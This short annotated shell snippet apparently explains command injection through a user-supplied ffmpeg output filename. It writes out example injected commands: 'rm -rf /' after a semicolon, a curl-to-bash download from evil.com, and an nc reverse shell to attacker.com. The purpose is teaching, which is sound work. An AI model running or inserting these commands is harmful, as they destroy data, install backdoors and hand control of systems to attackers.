# User supplies the output filename. Attacker sends: "out.jpg; rm -rf /"
ffmpeg -i input.jpg -vf scale=800:600 out.jpg; rm -rf /
#                                       ↑ ffmpeg done  ↑ now this runs

# Attacker can also use:
# out.jpg && curl evil.com/malware.sh | bash    (install backdoor)
# out.jpg & nc -e /bin/sh attacker.com 4444 &   (reverse shell in background)
